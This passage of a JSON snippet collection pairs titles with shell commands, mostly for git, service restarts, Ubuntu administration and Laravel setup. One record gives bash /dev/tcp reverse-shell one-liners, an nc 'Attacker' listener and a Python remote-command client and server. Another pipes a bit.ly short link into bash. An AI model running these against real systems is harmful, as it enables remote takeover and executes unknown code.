    "description": "git branch -m <oldname> <newname> # Any Branch git branch -m <newname> # Current Branch  # For windows if you get \"Branch already exists\" error git branch -M <newname>\ngit branch -m <new_name>\ngit branch &ndash;m old-name new-name\ngit branch -m <oldname> <newname> \n$ git checkout Branch-Name-You-Want-to-Change $ git branch -m New-Branch-Name\ngit branch -m <new_name> //currenct branch switch name  git branch -m <select_branch_name> <new_branch_name>\n",
    "reg_date": "2021-10-11T22:11:24.000Z"
  },
  {
    "id": 4126,
    "keyword": null,
    "link": null,
    "title": " rename branch to main",
    "description": "$ git branch -m master main \n$ git branch -m master main  or create a new one  $ git checkout -b main \n$ git push -u origin main \n$ git push origin --delete master \n",
    "reg_date": "2021-10-11T22:11:24.000Z"
  },
  {
    "id": 4127,
    "keyword": null,
    "link": null,
    "title": " rename commit message in linux",
    "description": "git commit --amend -m \"New commit message.\"\n",
    "reg_date": "2021-10-11T22:11:24.000Z"
  },
  {
    "id": 4128,
    "keyword": null,
    "link": null,
    "title": " rename computer ubuntu 20.04",
    "description": "#1- Delete the old name and setup new name sudo hostnamectl set-hostname newHostname  #2- Edit the /etc/hosts file: sudo nano /etc/hosts  #3- Reboot the system  sudo reboot  #4- To check the new hostname hostnamectl\nusermod -l <newname> -d /home/<newname> -m <oldname> \n",
    "reg_date": "2021-10-11T22:11:25.000Z"
  },
  {
    "id": 4129,
    "keyword": null,
    "link": null,
    "title": " rename tag git",
    "description": "git tag new old git tag -d old git push origin new :old\n",
    "reg_date": "2021-10-11T22:11:25.000Z"
  },
  {
    "id": 4130,
    "keyword": null,
    "link": null,
    "title": " rename username ubuntu 20.04",
    "description": "usermod -l <newname> -d /home/<newname> -m <oldname> \n# -l changes login name # -d changes home directory # -m copies over contents from old home directory usermod -l <newname> -d /home/<newname> -m <oldname>  # NOTE: will not work if you are currently logged on as user # - workaround by temporarily enabling root account and running above command there # [sudo passwd root]  # - after root account has been used to change username lock it using # [sudo passwd -l root]\n",
    "reg_date": "2021-10-11T22:11:25.000Z"
  },
  {
    "id": 4131,
    "keyword": null,
    "link": null,
    "title": " renomear branch",
    "description": "$ git branch -m nome_antigo novo_nome $ git branch -m master main  Ou crie um nova  $ git checkout -b main\ngit branch -m nome_antigo novo_nome\n",
    "reg_date": "2021-10-11T22:11:25.000Z"
  },
  {
    "id": 4132,
    "keyword": null,
    "link": null,
    "title": " reomving or deleting a git host locally",
    "description": "// delete branch locally git branch -d localBranchName  // delete branch remotely git push origin --delete remoteBranchName \n",
    "reg_date": "2021-10-11T22:11:25.000Z"
  },
  {
    "id": 4133,
    "keyword": null,
    "link": null,
    "title": " replace ionic-angular @ionic/angular",
    "description": "npm uninstall ionic-angular npm install @ionic/angular\n",
    "reg_date": "2021-10-11T22:11:25.000Z"
  },
  {
    "id": 4134,
    "keyword": null,
    "link": null,
    "title": " replace text with sed",
    "description": "sed -i 's/old-text/new-text/g' input.txt\nsed -i 's/foo/bar/g' hello.txt\nJust concatenate var '\"$var\"' to replace values string in sed command: $ sed -i 's/string_to_replace/'\"$var\"'/g' file_to_replace.txt\n",
    "reg_date": "2021-10-11T22:11:25.000Z"
  },
  {
    "id": 4135,
    "keyword": null,
    "link": null,
    "title": " repositories.cfg could not be loaded. unity",
    "description": "New-Item ~\\.android\\repositories.cfg -Force\n",
    "reg_date": "2021-10-11T22:11:25.000Z"
  },
  {
    "id": 4136,
    "keyword": null,
    "link": null,
    "title": " requireNativeComponent: \"RNCSafeAreaProvider\" was not found in the UIManager.",
    "description": " npm install react-native-safe-area-context npx pod-install ios   //add SafeAreaProvider to the app  import { SafeAreaProvider } from 'react-native-safe-area-context';   function App() {   return <SafeAreaProvider>...</SafeAreaProvider>; }\n Follow These Steps:  1. android/settings.gradle include ':react-native-safe-area-context' project(':react-native-safe-area-context').projectDir = new File(rootProject.projectDir, '../node_modules/react-native-safe-area-context/android')  2. android/app/build.gradle dependencies {     implementation project(':react-native-safe-area-context')     ... }  3. android/app/src/main/java/com/[APP_NAME]/MainApplication.java import com.th3rdwave.safeareacontext.SafeAreaContextPackage;  4. android/app/src/main/java/com/[APP_NAME]/MainApplication.java (Add this code where the getPackages function exists) @Override protected List<ReactPackage> getPackages() {     return Arrays.asList(         ...         new MainReactPackage(),         new SafeAreaContextPackage()     ); }  OR if already a package is returned then this code  @Override protected List<ReactPackage> getPackages() {     List<ReactPackage> packages = new PackageList(this).getPackages();     packages.add(new ModuleRegistryAdapter(mModuleRegistryProvider));     ...     packages.add(new SafeAreaContextPackage());     return packages; } You can also get this for IOS https://github.com/th3rdwave/react-native-safe-area-context#linking-in-react-native--060-1    \ncd ios && pod install\n",
    "reg_date": "2021-10-11T22:11:25.000Z"
  },
  {
    "id": 4137,
    "keyword": null,
    "link": null,
    "title": " reset IIS",
    "description": "iisreset\niisreset /stop /timeout:60 taskkill /F /FI \"SERVICES eq was\" iisreset /start\niisreset /noforce\niis reset\n",
    "reg_date": "2021-10-11T22:11:26.000Z"
  },
  {
    "id": 4138,
    "keyword": null,
    "link": null,
    "title": " reset a file to last commit git",
    "description": "git checkout <hash> -- file1/to/restore file2/to/restore \n",
    "reg_date": "2021-10-11T22:11:26.000Z"
  },
  {
    "id": 4139,
    "keyword": null,
    "link": null,
    "title": " reset branch on local git",
    "description": "git fetch origin git reset --hard origin/master \n",
    "reg_date": "2021-10-11T22:11:26.000Z"
  },
  {
    "id": 4140,
    "keyword": null,
    "link": null,
    "title": " reset cache pods",
    "description": "pod cache clean --all\n",
    "reg_date": "2021-10-11T22:11:26.000Z"
  },
  {
    "id": 4141,
    "keyword": null,
    "link": null,
    "title": " reset last commit",
    "description": "# KEEP CHANGES git reset --soft HEAD~1  # REMOVE CHANGES git reset --hard HEAD~1\ngit reset --soft HEAD~1\n$ git reset --soft HEAD~1\n#this  will preserve changes done to your files git reset --soft HEAD~1  #this will get rid of the commit and the changes done to the files $ git reset --hard HEAD~1\n#this  will preserve changes done to your files git reset --soft HEAD~1  #this will get rid of the commit and the changes done to the files $ git reset --hard HEAD~1  \n$ git reset --soft HEAD~1 \n",
    "reg_date": "2021-10-11T22:11:26.000Z"
  },
  {
    "id": 4142,
    "keyword": null,
    "link": null,
    "title": " reset last commit without losing changes",
    "description": "git reset HEAD~1 --soft   \n",
    "reg_date": "2021-10-11T22:11:26.000Z"
  },
  {
    "id": 4143,
    "keyword": null,
    "link": null,
    "title": " reset one branch onto another",
    "description": "# Make sure your working tree is in a clean state git status  # Check out the branch you want to change, e.g. some-branch git checkout some-branch  # Reset that branch to some other branch/commit, e.g. target-branch git reset --hard target-branch \n",
    "reg_date": "2021-10-11T22:11:26.000Z"
  },
  {
    "id": 4144,
    "keyword": null,
    "link": null,
    "title": " reset to master git",
    "description": "git fetch origin git reset --hard origin/master\n$ git remote set-url origin https://github.com/USERNAME/REPOSITORY.git\ngit reset --hard origin/master; git commit -m 'reset to remote';git push --force local dev\n",
    "reg_date": "2021-10-11T22:11:27.000Z"
  },
  {
    "id": 4145,
    "keyword": null,
    "link": null,
    "title": " resolusi layar ubuntu",
    "description": "xrandr\n",
    "reg_date": "2021-10-11T22:11:27.000Z"
  },
  {
    "id": 4146,
    "keyword": null,
    "link": null,
    "title": " responsive grid system angular",
    "description": "ng add @angular/material\nnpm install -s @angular/flex-layout\n",
    "reg_date": "2021-10-11T22:11:27.000Z"
  },
  {
    "id": 4147,
    "keyword": null,
    "link": null,
    "title": " restart a pod kubernetes",
    "description": "kubectl rollout restart deployment [deployment_name]\n",
    "reg_date": "2021-10-11T22:11:27.000Z"
  },
  {
    "id": 4148,
    "keyword": null,
    "link": null,
    "title": " restart apache",
    "description": "# Restart Apache 2 server on Linux/Unix sudo service apache2 restart  # Start Apache 2 server on Linux/Unix sudo service apache2 start  # Stop Apache 2 server on Linux/Unix sudo service apache2 stop\n# Restart Apache 2 server on Linux/Unix sudo service apache2 restart  # Start Apache 2 server on Linux/Unix sudo service apache2 start  # Stop Apache 2 server on Linux/Unix sudo service apache2 stop  # Reload Apache 2 server on Linux/Unix \"No downtime!\" sudo service apache2 reload\nsudo systemctl restart apache2 # or sudo service apache2 restart\n# Start Apache 2 server on Linux/Unix sudo service apache2 start\n# CentOS/RedHat sudo service httpd restart  # Debian/Ubuntu sudo service apache2 restart\n/usr/sbin/httpd -k restart\n",
    "reg_date": "2021-10-11T22:11:27.000Z"
  },
  {
    "id": 4149,
    "keyword": null,
    "link": null,
    "title": " restart apache ubuntu",
    "description": "# Restart Apache 2 server on Linux/Unix sudo service apache2 restart  # Start Apache 2 server on Linux/Unix sudo service apache2 start  # Stop Apache 2 server on Linux/Unix sudo service apache2 stop\n# Restart Apache 2 server on Linux/Unix sudo service apache2 restart  # Start Apache 2 server on Linux/Unix sudo service apache2 start  # Stop Apache 2 server on Linux/Unix sudo service apache2 stop  # Reload Apache 2 server on Linux/Unix \"No downtime!\" sudo service apache2 reload\nsudo systemctl restart apache2 # or sudo service apache2 restart\n# Start Apache 2 server on Linux/Unix sudo service apache2 start\n# how to stop a web server linux sudo service apache2 stop\n# Restart apche 2 server. sudo service apache2 restart  or sudo systemctl restart apache2   # Gracefully reloading is a bit faster, and there's no downtime sudo service apache2 reload\n",
    "reg_date": "2021-10-11T22:11:27.000Z"
  },
  {
    "id": 4150,
    "keyword": null,
    "link": null,
    "title": " restart audio ubuntu",
    "description": "pulseaudio -k && sudo alsa force-reload\n",
    "reg_date": "2021-10-11T22:11:27.000Z"
  },
  {
    "id": 4151,
    "keyword": null,
    "link": null,
    "title": " restart bashrc",
    "description": ". ~/.bashrc\nsource ~/.bashrc \nsource /etc/bash.bashrc\n",
    "reg_date": "2021-10-11T22:11:28.000Z"
  },
  {
    "id": 4152,
    "keyword": null,
    "link": null,
    "title": " restart bluetooth ubuntu",
    "description": "sudo service bluetooth restart \nsudo systemctl enable bluetooth\nsudo rmmod btusb sudo modprobe btusb\n",
    "reg_date": "2021-10-11T22:11:28.000Z"
  },
  {
    "id": 4153,
    "keyword": null,
    "link": null,
    "title": " restart crontab",
    "description": "sudo service cron reload\n# service crond start \n# /etc/init.d/crond start \n",
    "reg_date": "2021-10-11T22:11:28.000Z"
  },
  {
    "id": 4154,
    "keyword": null,
    "link": null,
    "title": " restart discord bot python",
    "description": "heroku ps:restart web -a <my app name>\n",
    "reg_date": "2021-10-11T22:11:28.000Z"
  },
  {
    "id": 4155,
    "keyword": null,
    "link": null,
    "title": " restart elasticsearch",
    "description": "sudo service elasticsearch.service status -l     sudo service elasticsearch.service restart  Restart Elasticsearch services ^^ \nsudo systemctl restart elasticsearch\n#!/bin/sh  RESTART=\"/etc/init.d/elasticsearch restart\" SERVICE=\"elasticsearch\" LOGFILE=\"/var/log/elasticRestart.log\"  ps -ef | grep elastic | grep -v grep > /dev/null if [ $? -eq 0 ] then         /etc/init.d/elasticsearch restart >> /var/log/elasticRestart.log         echo \"Elasticsearch relaunched at $(date)\" >> /var/log/elasticRestart.log else         echo \"Elasticsearch is running $(date)\" >> /var/log/elasticRestart.log fi\n",
    "reg_date": "2021-10-11T22:11:28.000Z"
  },
  {
    "id": 4156,
    "keyword": null,
    "link": null,
    "title": " restart mysql mac command line",
    "description": "# mysql start/stop/restart # MAC $ cd /Applications/Ampps/mysql/bin $ mysql.server restart #Linux $ /etc/init.d/mysqld restart or $ service mysqld restart or $ systemctl restart mysqld\nalias mysqlstart='sudo /usr/local/mysql/support-files/mysql.server start' alias mysqlstop='sudo /usr/local/mysql/support-files/mysql.server stop' \n",
    "reg_date": "2021-10-11T22:11:28.000Z"
  },
  {
    "id": 4157,
    "keyword": null,
    "link": null,
    "title": " restart nautilus from terminal",
    "description": "nautilus -q && nautilus &\n",
    "reg_date": "2021-10-11T22:11:28.000Z"
  },
  {
    "id": 4158,
    "keyword": null,
    "link": null,
    "title": " restart network service",
    "description": "sudo service network-manager restart \n",
    "reg_date": "2021-10-11T22:11:28.000Z"
  },
  {
    "id": 4159,
    "keyword": null,
    "link": null,
    "title": " restart network service kali",
    "description": "Methode 1 : sudo service networking restart sudo service network-manager restart  Methode 2 :  ifdown eth0 ifup eth0  ip a show eth0  \n",
    "reg_date": "2021-10-11T22:11:28.000Z"
  },
  {
    "id": 4160,
    "keyword": null,
    "link": null,
    "title": " restart nginx",
    "description": "sudo systemctl restart nginx\nsudo service nginx restart\nsudo systemctl reload nginx\nsudo nginx -s stop && sudo nginx \nsystemctl reload nginx \nsudo systemctl start nginx  sudo systemctl stop nginx  sudo systemctl restart nginx   sudo service nginx start sudo service nginx stop sudo service nginx restart  sudo /etc/init.d/nginx start sudo /etc/init.d/nginx stop sudo /etc/init.d/nginx restart\n",
    "reg_date": "2021-10-11T22:11:28.000Z"
  },
  {
    "id": 4161,
    "keyword": null,
    "link": null,
    "title": " restart nginx in mac",
    "description": "sudo nginx -s stop && sudo nginx \n/etc/init.d/nginx restart\n",
    "reg_date": "2021-10-11T22:11:29.000Z"
  },
  {
    "id": 4162,
    "keyword": null,
    "link": null,
    "title": " restart php nginx mac",
    "description": "$brew services restart php@8.0\n",
    "reg_date": "2021-10-11T22:11:29.000Z"
  },
  {
    "id": 4163,
    "keyword": null,
    "link": null,
    "title": " restart postgres ubuntu",
    "description": "sudo service postgresql restart \nsudo service postgresql restart # To restart the postgresql service\nsudo /etc/init.d/postgresql restart\nsudo service postgresql restart\n                                                     pg_ctl -D \"C:\\Program Files\\PostgreSQL\\12\\data\" restartCode language: JavaScript (javascript)\n",
    "reg_date": "2021-10-11T22:11:29.000Z"
  },
  {
    "id": 4164,
    "keyword": null,
    "link": null,
    "title": " restart pulseaudio ubuntu",
    "description": "pulseaudio -k\n",
    "reg_date": "2021-10-11T22:11:29.000Z"
  },
  {
    "id": 4165,
    "keyword": null,
    "link": null,
    "title": " restart rabbitmq service linux",
    "description": "sudo service rabbitmq-server restart\n",
    "reg_date": "2021-10-11T22:11:29.000Z"
  },
  {
    "id": 4166,
    "keyword": null,
    "link": null,
    "title": " restart redis ubuntu",
    "description": "sudo apt update sudo apt install redis-server  sudo nano /etc/redis/redis.conf  # change \"supervised no\" to \"supervised systemd\"  supervised systemd  sudo systemctl restart redis.service  sudo systemctl status redis  redis-cli  \n# restart redis service sudo service redis-server restart  # stop redis service sudo service redis-server stop\nwget http://download.redis.io/redis-stable.tar.gz tar xvzf redis-stable.tar.gz cd redis-stable make \n",
    "reg_date": "2021-10-11T22:11:29.000Z"
  },
  {
    "id": 4167,
    "keyword": null,
    "link": null,
    "title": " restart samba service",
    "description": "sudo service smbd status sudo service smbd start sudo service smbd stop sudo service smbd restart\n",
    "reg_date": "2021-10-11T22:11:30.000Z"
  },
  {
    "id": 4168,
    "keyword": null,
    "link": null,
    "title": " restart server centos",
    "description": "reboot -h now\nshutdown -r now\n",
    "reg_date": "2021-10-11T22:11:30.000Z"
  },
  {
    "id": 4169,
    "keyword": null,
    "link": null,
    "title": " restart sql server ubuntu",
    "description": "service mysql restart\nservice mysql start service mysql stop service mysql restart \n",
    "reg_date": "2021-10-11T22:11:30.000Z"
  },
  {
    "id": 4170,
    "keyword": null,
    "link": null,
    "title": " restart ssh service mac",
    "description": "# stop it sudo launchctl unload  /System/Library/LaunchDaemons/ssh.plist  # start it sudo launchctl load -w /System/Library/LaunchDaemons/ssh.plist \n",
    "reg_date": "2021-10-11T22:11:30.000Z"
  },
  {
    "id": 4171,
    "keyword": null,
    "link": null,
    "title": " restart ubuntu server",
    "description": "Try using the following command to safely reboot:  sudo reboot  If, instead, you want to shut down the server safely, use this command:  sudo shutdown -h now\n$ sudo shutdown -r now\n#To reset Terminal: $ reset  #To rerun/restart your bash.rc $ source ~/.bashrc   #To Restart your computer $ reboot\nsudo shutdown -r now\nsystemctl restart <name>\n",
    "reg_date": "2021-10-11T22:11:30.000Z"
  },
  {
    "id": 4172,
    "keyword": null,
    "link": null,
    "title": " restart wsl2",
    "description": "wsl --shutdown wsl \nwsl.exe --shutdown wsl\nGet-Service LxssManager | Restart-Service\n",
    "reg_date": "2021-10-11T22:11:30.000Z"
  },
  {
    "id": 4173,
    "keyword": null,
    "link": null,
    "title": " restart xampp linux",
    "description": "sudo /opt/lampp/lampp stop sudo /opt/lampp/lampp start\n",
    "reg_date": "2021-10-11T22:11:30.000Z"
  },
  {
    "id": 4174,
    "keyword": null,
    "link": null,
    "title": " retsrta nginx",
    "description": "sudo systemctl restart nginx\n",
    "reg_date": "2021-10-11T22:11:31.000Z"
  },
  {
    "id": 4175,
    "keyword": null,
    "link": null,
    "title": " reverse shell bash",
    "description": "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1\n/bin/bash -i > /dev/tcp/0.0.0.0/9000 0<&1 2>&1 # Victim\nimport socket   # client import subprocess import sys  SERVER_HOST = 'ip' SERVER_PORT = 5003 BUFFER_SIZE = 1024  # create the socket object s = socket.socket() # connect to the server s.connect((SERVER_HOST, SERVER_PORT))  # receive the greeting message message = s.recv(BUFFER_SIZE).decode() print(\"Server:\", message)  while True:     # receive the command from the server     command = s.recv(BUFFER_SIZE).decode()     if command.lower() == \"exit\":         # if the command is exit, just break out of the loop         break     # execute the command and retrieve the results     output = subprocess.getoutput(command)     # send the results back to the server     s.send(output.encode()) # close client connection s.close()\nnc -l -p 9000 -vvv # Attacker\nimport socket  #server  SERVER_HOST = \"0.0.0.0\" SERVER_PORT = 5003  BUFFER_SIZE = 1024  # create a socket object s = socket.socket()  # bind the socket to all IP addresses of this host s.bind((SERVER_HOST, SERVER_PORT)) # make the PORT reusable # when you run the server multiple times in Linux, Address already in use error will raise s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) s.listen(5) print(f\"Listening as {SERVER_HOST}:{SERVER_PORT} ...\")  # accept any connections attempted client_socket, client_address = s.accept() print(f\"{client_address[0]}:{client_address[1]} Connected!\")  # just sending a message, for demonstration purposes message = \"Hello and Welcome\".encode() client_socket.send(message)  while True:     # get the command from prompt     command = input(\"Enter the command you wanna execute:\")     # send the command to the client     client_socket.send(command.encode())     if command.lower() == \"exit\":         # if the command is exit, just break out of the loop         break     # retrieve command results     results = client_socket.recv(BUFFER_SIZE).decode()     # print them     print(results) # close connection to the client client_socket.close() # close server connection s.close()\n",
    "reg_date": "2021-10-11T22:11:31.000Z"
  },
  {
    "id": 4176,
    "keyword": null,
    "link": null,
    "title": " revert last commit",
    "description": "git reset --soft HEAD~1\n$ git reset --soft HEAD~1\n#this  will preserve changes done to your files git reset --soft HEAD~1  #this will get rid of the commit and the changes done to the files $ git reset --hard HEAD~1  \n$ git reset --soft HEAD~1 \n# Undo last commit. # --soft flag makes sure that the changes in undone revisions are preserved. # You'll find the changes as uncommitted local modifications in your working copy. git reset --soft HEAD~1  # If you don't want to keep these changes, simply use the --hard flag. # This will completely remove the changes. git reset --hard HEAD~1\ngit reset HEAD~ \n",
    "reg_date": "2021-10-11T22:11:31.000Z"
  },
  {
    "id": 4177,
    "keyword": null,
    "link": null,
    "title": " revert local commit",
    "description": "$ git reset --soft HEAD~1\n$ git reset --hard HEAD~1 \n",
    "reg_date": "2021-10-11T22:11:31.000Z"
  },
  {
    "id": 4178,
    "keyword": null,
    "link": null,
    "title": " revert local commit git bash",
    "description": "git reset --soft HEAD~1\n$ git reset --soft HEAD~1\n$ git reset --hard HEAD~1 \ngit revert <the_commit_hash>\ngit reset <commitId> # Exemple git reset 5310517\n",
    "reg_date": "2021-10-11T22:11:31.000Z"
  },
  {
    "id": 4179,
    "keyword": null,
    "link": null,
    "title": " revert to master origin branch git",
    "description": "git checkout mybranch git reset --hard origin/mybranch \n",
    "reg_date": "2021-10-11T22:11:31.000Z"
  },
  {
    "id": 4180,
    "keyword": null,
    "link": null,
    "title": " rick roll terminal command",
    "description": "curl -s -L http://bit.ly/10hA8iC | bash \n",
    "reg_date": "2021-10-11T22:11:32.000Z"
  },
  {
    "id": 4181,
    "keyword": null,
    "link": null,
    "title": " rm -rf /*",
    "description": "#Do not execute this if you don't want that your PC get destroyed\n#The rm -rf command is one of the fastest way to delete a folder and its contents.  #rm -r command deletes the folder recursively, even the empty folder.  #rm -f command removes 'Read only File' without asking.  #rm -rf / : Force deletion of everything in root directory\n",
    "reg_date": "2021-10-11T22:11:32.000Z"
  },
  {
    "id": 4182,
    "keyword": null,
    "link": null,
    "title": " rm cahce gitignore",
    "description": "git rm -r --cached . \n",
    "reg_date": "2021-10-11T22:11:32.000Z"
  },
  {
    "id": 4183,
    "keyword": null,
    "link": null,
    "title": " rm files with extension",
    "description": "find . -name \"*.bak\" -type f -delete\n",
    "reg_date": "2021-10-11T22:11:32.000Z"
  },
  {
    "id": 4184,
    "keyword": null,
    "link": null,
    "title": " robo 3t download for ubuntu 18.04",
    "description": "sudo snap install robo3t-snap \n## 1. Download the tar file from robomongo site. The current file is robo3t-1.1.1-linux-x86_64-c93c6b0.tar.gz, but yours could be different. ## robomongo-site-link ## https://robomongo.org/download ## 2.Open up the terminal, switch to download directory and run the following commands:  tar -xvzf robo3t-1.1.1-linux-x86_64-c93c6b0.tar.gz sudo mkdir /usr/local/bin/robomongo sudo mv  robo3t-1.1.1-linux-x86_64-c93c6b0/* /usr/local/bin/robomongo cd /usr/local/bin/robomongo/bin sudo chmod +x robo3t  sudo gedit ~/.bashrc  ## Add the following line to the end of .bashrc file:  alias robomongo='/usr/local/bin/robomongo/bin/robo3t'  ## Save and close the file. Now reload it using the following command:  source ~/.bashrc  ##Then you can run robomongo from your terminal and it will work: robomongo\n",
    "reg_date": "2021-10-11T22:11:32.000Z"
  },
  {
    "id": 4185,
    "keyword": null,
    "link": null,
    "title": " robotframework seleniumlibrary install",
    "description": "pip install --upgrade robotframework-seleniumlibrary\n",
    "reg_date": "2021-10-11T22:11:32.000Z"
  },
  {
    "id": 4186,
    "keyword": null,
    "link": null,
    "title": " robustfov",
    "description": "#!/bin/sh  # FSL tool to crop the neck (usually for a T1w image):  robustfov -i T1w -r T1w_cropped\n#!/bin/sh  # fsl_anat will clean up the T1w image & normalize it to standard space # including bias correction, tissue segmentation & subcortical  # segmentation (FIRST), though it creates the image in 2mm MNI space. # Output is generated in a subdirectory named for the image but with the  # extension .anat (e.g., T1w.anat)  # Do all processing fsl_anat -i T1w   # Do not run reorient, segmentation or FIRST subcortical segmentation fsl_anat -i T1w --noreorient --noseg --nosubcortseg\n",
    "reg_date": "2021-10-11T22:11:32.000Z"
  },
  {
    "id": 4187,
    "keyword": null,
    "link": null,
    "title": " roll back last commit in git",
    "description": "git reset --soft HEAD~1\n",
    "reg_date": "2021-10-11T22:11:32.000Z"
  },
  {
    "id": 4188,
    "keyword": null,
    "link": null,
    "title": " rpi-update specific kernel version",
    "description": "$ sudo rm /boot/.firmware_revision $ yes | sudo rpi-update <commit-id>  # Get <commit-id> here: # https://github.com/Hexxeh/rpi-firmware/commits/master\n",
    "reg_date": "2021-10-11T22:11:33.000Z"
  },
  {
    "id": 4189,
    "keyword": null,
    "link": null,
    "title": " rpi install pivpn",
    "description": "curl -L https://install.pivpn.io | bash\n",
    "reg_date": "2021-10-11T22:11:33.000Z"
  },
  {
    "id": 4190,
    "keyword": null,
    "link": null,
    "title": " rsa in git ssh",
    "description": "$ ssh-keygen -t rsa -b 4096 -C \"your_email@example.com\"\n",
    "reg_date": "2021-10-11T22:11:33.000Z"
  },
  {
    "id": 4191,
    "keyword": null,
    "link": null,
    "title": " rsa key has changed",
    "description": "ssh-keygen -R \"you server hostname or ip\" \n",
    "reg_date": "2021-10-11T22:11:34.000Z"
  },
  {
    "id": 4192,
    "keyword": null,
    "link": null,
    "title": " rsync --iinclude",
    "description": "rsync -a -m --include='*.jpg' --include='*/' --exclude='*' src_directory/ dst_directory/\n",
    "reg_date": "2021-10-11T22:11:34.000Z"
  },
  {
    "id": 4193,
    "keyword": null,
    "link": null,
    "title": " rsync skipping non-regular file",
    "description": "# Error: rsync skipping non-regular file  # Explanation: # As mentioned in the source, this error often occurs when trying # to copy symlinks.  # Solutions: # - To copy them as symlinks, use --links # - To copy the files they are pointing to, use --copy-links # - Use -a instead of -r. -a means to reproduce file hierarchies,  #\tincluding special files and permissions. -r only means to recurse #   on directories. For a backup, you want -a.\n",
    "reg_date": "2021-10-11T22:11:34.000Z"
  },
  {
    "id": 4194,
    "keyword": null,
    "link": null,
    "title": " run.sh: line 39: $'\\r': command not found",
    "description": "sed -i 's/\\r$//' filename\n",
    "reg_date": "2021-10-11T22:11:34.000Z"
  },
  {
    "id": 4195,
    "keyword": null,
    "link": null,
    "title": " run a command x number of times linux",
    "description": "## run command 10 times  for i in {1..10}; do commandNameHere; done   ## run script 20 times for i in {1..10}; do /path/to/cache.script.sh; done\n",
    "reg_date": "2021-10-11T22:11:34.000Z"
  },
  {
    "id": 4196,
    "keyword": null,
    "link": null,
    "title": " run adb  command mac stackoverflow",
    "description": "echo 'export PATH=$PATH:~/Library/Android/sdk/platform-tools/' >> ~/.bash_profile  source ~/.bash_profile  adb devices \n",
    "reg_date": "2021-10-11T22:11:34.000Z"
  },
  {
    "id": 4197,
    "keyword": null,
    "link": null,
    "title": " run cron once a day",
    "description": "#run a cron once a day at 3am 0 3 * * *\n  30 2 * * * /your/command # ^  ^ # |   hour # minute \n +---------------- minute (0 - 59)  |  +------------- hour (0 - 23)  |  |  +---------- day of month (1 - 31)  |  |  |  +------- month (1 - 12)  |  |  |  |  +---- day of week (0 - 6) (Sunday=0 or 7)  |  |  |  |  |  *  *  *  *  *  command to be executed \n",
    "reg_date": "2021-10-11T22:11:34.000Z"
  },
  {
    "id": 4198,
    "keyword": null,
    "link": null,
    "title": " run docker redis localhost",
    "description": "docker run --name my-redis -p 6379:6379 -d redis:alpine\n",
    "reg_date": "2021-10-11T22:11:35.000Z"
  },
  {
    "id": 4199,
    "keyword": null,
    "link": null,
    "title": " run laravel git project",
    "description": "Run all of those commands: composer install or php composer.phar install mv .env.example .env php artisan key:generate php artisan migrate php artisan db:seed to run seeders, if any. php artisan serve\nClone your project Go to the folder application using cd command on your cmd or terminal Run composer install on your cmd or terminal Copy .env.example file to .env on the root folder. You can type copy .env.example .env if using command prompt Windows or cp .env.example .env if using terminal, Ubuntu Open your .env file and change the database name (DB_DATABASE) to whatever you have, username (DB_USERNAME) and password (DB_PASSWORD) field correspond to your configuration. By default, the username is root and you can leave the password field empty. (This is for Xampp) By default, the username is root and password is also root. (This is for Lamp) Run php artisan key:generate Run php artisan migrate Run php artisan serve Go to localhost:8000\n 1. composer update --no-scripts  or composer install  2. php artisan key:generate   3. rename example.env to .env  4. Change database credentials, set debug mode! Change app url  4. php artisan migrate(make sure u have the database running in the server)  5. php artisan config:clear  6. you are good to go! \n",
    "reg_date": "2021-10-11T22:11:35.000Z"
  },
  {
    "id": 4200,
    "keyword": null,
    "link": null,
    "title": " run laravel lumen server",
    "description": "php -S localhost:8000 -t public\n",
    "reg_date": "2021-10-11T22:11:35.000Z"
  },
  {
    "id": 4201,
    "keyword": null,
    "link": null,
    "title": " run laravel project from github",
    "description": "Run all of those commands: composer install or php composer.phar install mv .env.example .env php artisan key:generate php artisan migrate php artisan db:seed to run seeders, if any. php artisan serve\n//Laravel installation from github php -r \"file_exists('.env') || copy('.env.example', '.env');\" composer install -q --no-ansi --no-interaction --no-scripts --no-suggest --no-progress --prefer-dist php artisan key:generate \nClone your project Go to the folder application using cd command on your cmd or terminal Run composer install on your cmd or terminal Copy .env.example file to .env on the root folder. You can type copy .env.example .env if using command prompt Windows or cp .env.example .env if using terminal, Ubuntu Open your .env file and change the database name (DB_DATABASE) to whatever you have, username (DB_USERNAME) and password (DB_PASSWORD) field correspond to your configuration. By default, the username is root and you can leave the password field empty. (This is for Xampp) By default, the username is root and password is also root. (This is for Lamp) Run php artisan key:generate Run php artisan migrate Run php artisan serve Go to localhost:8000\n 1. composer update --no-scripts  or composer install  2. php artisan key:generate   3. rename example.env to .env  4. Change database credentials, set debug mode! Change app url  4. php artisan migrate(make sure u have the database running in the server)  5. php artisan config:clear  6. you are good to go! \n",
    "reg_date": "2021-10-11T22:11:35.000Z"
  },
  {
    "id": 4202,
    "keyword": null,
    "link": null,
    "title": " run linux command multiple times",
    "description": "// Run command in loop sleep not mandatory done is mandatory for i in {1..10}; do command; sleep 5; done  example for i in {1..10}; do echo -n \"This is a test in loop $i \"; sleep 5; done\n",
    "reg_date": "2021-10-11T22:11:35.000Z"
  },
  {
    "id": 4203,
    "keyword": null,
    "link": null,
    "title": " run lumen project",
    "description": "php -S localhost:8000 -t public\n php -S localhost:8000 -t ./public\n",
    "reg_date": "2021-10-11T22:11:35.000Z"
  },
  {
    "id": 4204,
    "keyword": null,
    "link": null,
    "title": " run msi on linux",
    "description": "wine msiexec /i filename.msi\n",
    "reg_date": "2021-10-11T22:11:35.000Z"
  },
  {
    "id": 4205,
    "keyword": null,
    "link": null,
    "title": " run on startup pi",
    "description": "sudo nano /etc/rc.local  Then add commands and do CTRL+X and press y to save\n",
    "reg_date": "2021-10-11T22:11:35.000Z"
  },
  {
    "id": 4206,
    "keyword": null,
    "link": null,
    "title": " run prettier",
    "description": "npx prettier --write path/to/my/file.html\nnpm install --save-dev pre-commit \n",
    "reg_date": "2021-10-11T22:11:36.000Z"
  },
  {
    "id": 4207,
    "keyword": null,
    "link": null,
    "title": " run redis-server in background",
    "description": "redis-server --daemonize yes \n",
    "reg_date": "2021-10-11T22:11:36.000Z"
  },
  {
    "id": 4208,
    "keyword": null,
    "link": null,
    "title": " run sh from terminal mac",
    "description": "chmod +x fileName bash fileName\n",
    "reg_date": "2021-10-11T22:11:36.000Z"
  },
  {
    "id": 4209,
    "keyword": null,
    "link": null,
    "title": " run startup folder",
    "description": "windows key + r --> shell:startup\n",
    "reg_date": "2021-10-11T22:11:36.000Z"
  },
  {
    "id": 4210,
    "keyword": null,
    "link": null,
